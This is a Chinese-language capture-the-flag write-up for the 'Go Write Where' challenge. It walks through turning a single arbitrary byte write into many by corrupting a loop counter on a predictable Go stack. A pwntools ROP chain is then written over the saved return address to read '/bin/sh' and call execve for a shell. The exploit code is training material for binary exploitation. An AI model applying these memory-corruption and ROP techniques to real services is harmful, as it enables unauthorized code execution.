# L3akCTF 2025 Go Write Where Writeup

## 题目简述

Go Write Where 是一个静态链接、No PIE 的 amd64 Go 程序。每轮允许用户任选地址读取或写入 1 字节，但外层循环原本只执行一次。利用 Go 主 goroutine 栈在题目容器中近乎固定的布局，可以先改大循环变量，获得大量任意字节写；随后逐字节覆盖保存的返回地址为 syscall ROP，先读取 `/bin/sh`，再调用 `execve`。

## 解题过程

### 从“一次原语”扩展为持续原语

源码直接把用户输入转换为指针：

```go
ptr := unsafe.Pointer(uintptr(addr))

if mode == "r" {
    val := *(*byte)(ptr)
    fmt.Printf("Value at %s: 0x%02X\n", addrStr, val)
} else if mode == "w" {
    *(*byte)(ptr) = byte(value)
}
```

但整个交互位于：

```go
for i := 1; i > 0; i-- {
    // 一次任意 1 字节读或写
}
```

正常情况下只操作一次。调试题目所附容器版本后，官方脚本使用：

```text
循环变量 i：0xc00010cdb8
main 返回地址：0xc00010cf48
```

第一次操作把 `i` 的第二个字节改为 `0xff`：

```python
write(0xc00010cdb8 + 1, 0xff)
```

原值从 `0x0001` 变为 `0xff01`。每轮结束虽然会减一，但仍足够完成数百次逐字节写。

这些 `0xc000...` 地址利用了本题 Go 运行时和固定容器内的可预测 goroutine 栈布局，并不是任意 Go 程序中的通用常量。若环境有偏差，应在同版本容器中调试 `main.main`，重新定位局部变量和保存返回地址。

### 准备任意读写函数

交互封装如下：

```python
def read_byte(addr):
    io.sendline(b"r")
    io.sendline(hex(addr).encode())
    io.recvuntil(hex(addr).encode() + b": ")
    return int(io.recvline(keepends=False), 16)

def write_byte(addr, value):
    io.sendline(b"w")
    io.sendline(hex(addr).encode())
    io.sendline(hex(value).encode())
    return io.clean()
```

程序为静态链接、No PIE，因此二进制内 gadget 和 `.bss` 地址固定。NX 阻止直接执行写入栈上的 shellcode，但不影响 syscall ROP。

### 构造 read 与 execve 两段 ROP

第一段 syscall 等价于：

```c
read(0, bss, very_large_size);
```

题目二进制中的关键 gadget 为：

```text
0x46b3e6  pop rdi; setne al; ret
0x4224c4  pop rax; ret
0x41338f  mov rsi, rax; ret
0x46e7c6  mov edx, 0x930f00e2; ret
0x463aa9  syscall; ret
```

`setne al` 的副作用随后会被 `pop rax` 覆盖。第一段把 `rdi` 设为 0、把 `.bss+0x300` 送入 `rsi`、把 `rax` 设为 0；`rdx` 虽然是很大的值，但对本次短输入没有妨碍。

第二段需要：

```c
execve(bss, NULL, NULL);
```

还会用到：

```text
0x412ac3  pop rcx; ret
0x404846  and edx, ecx; and eax, edx; ret
```

令 `rcx=0` 后，第二个 gadget 会把 `edx` 清零；再令 `rax=59` 即可执行 `execve`。完整 ROP 构造为：

```python
from pwn import *

exe = context.binary = ELF("./chall")
io = remote("challenge.host", 5000)

loop_counter = 0xc00010cdb8
saved_rip = 0xc00010cf48
bss = exe.bss(0x300)

# 扩大循环计数
write_byte(loop_counter + 1, 0xff)

rop = ROP(exe)
syscall_ret = rop.find_gadget(["syscall", "ret"]).address

# read(0, bss, 0x930f00e2)
rop.raw(0x46b3e6)
rop.raw(0)
rop.raw(0x4224c4)
rop.raw(bss)
rop.raw(0x41338f)
rop.raw(0x4224c4)
rop.raw(0)
rop.raw(0x46e7c6)
rop.raw(syscall_ret)

# execve(bss, NULL, NULL)
rop.raw(0x46b3e6)
rop.raw(bss)
rop.raw(0x4224c4)
rop.raw(0)
rop.raw(0x41338f)
rop.raw(0x412ac3)
rop.raw(0)
rop.raw(0x404846)
rop.raw(0x4224c4)
rop.raw(59)
rop.raw(syscall_ret)
```

### 逐字节覆盖返回地址并退出循环

每次只能写 1 字节，因此按小端字节序把 ROP 链写到保存的 RIP：

```python
chain = rop.chain()
for offset, value in enumerate(chain):
    write_byte(saved_rip + offset, value)
```

写完后先清除循环变量的高字节，再把低字节置零：

```python
write_byte(loop_counter + 1, 0)
write_byte(loop_counter, 0)
```

最后一次循环结束时执行 `i--`，条件不再成立，`main.main` 返回并进入 ROP 链。第一段 `read` 等待输入：

```python
io.sendline(b"/bin/sh\x00")
io.interactive()
```

第二段随即执行 `execve("/bin/sh", NULL, NULL)`。进入 shell 后读取：

```bash
cat flag.txt
```

得到：

```text
L3AK{60_574ck_15_4lm057_pr3d1c74bl3}
```

## 方法总结

本题最重要的转化是：一次任意字节写并非天然不足，只要同一栈帧里的循环控制变量也位于可预测地址，就能把一次原语扩展成大量原语。随后利用静态、No PIE 的 Go 二进制自带大量 gadget，逐字节写出 ROP 即可绕过 NX。

这类利用对运行环境非常敏感。固定的是二进制内 gadget，未必固定的是 goroutine 栈地址；可靠复现需要使用题目提供的容器版本校准 `i` 和保存 RIP。WP 中应把“题目环境的观测地址”和“跨环境成立的漏洞机制”明确区分。
